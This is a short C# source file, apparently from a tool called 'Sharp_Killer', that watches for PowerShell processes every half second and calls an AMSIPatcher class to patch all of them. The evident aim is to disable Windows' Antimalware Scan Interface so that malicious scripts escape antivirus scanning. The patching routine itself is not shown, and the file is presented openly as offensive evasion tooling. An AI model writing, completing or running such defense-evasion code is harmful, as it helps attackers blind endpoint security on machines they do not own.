using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Sharp_Killer
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            string processNameToMonitor = "powershell";

            Console.WriteLine($"Monitoring for Powershell.exe");

            AMSIPatcher amsiPatcher = new AMSIPatcher();
            CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();

            // Terminate the program when the user types 'exit'
            Task.Run(() =>
            {
                while (true)
                {
                    string userInput = Console.ReadLine();
                    if (userInput != null && userInput.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase))
                    {
                        cancellationTokenSource.Cancel();
                        break;
                    }
                }
            });

            while (true)
            {
                Process[] processes = Process.GetProcessesByName(processNameToMonitor);
                if (processes.Length > 0)
                    amsiPatcher.PatchAllPowershells();
                if (cancellationTokenSource.Token.IsCancellationRequested)
                    break;
                Thread.Sleep(500);
            }
        }
    }
}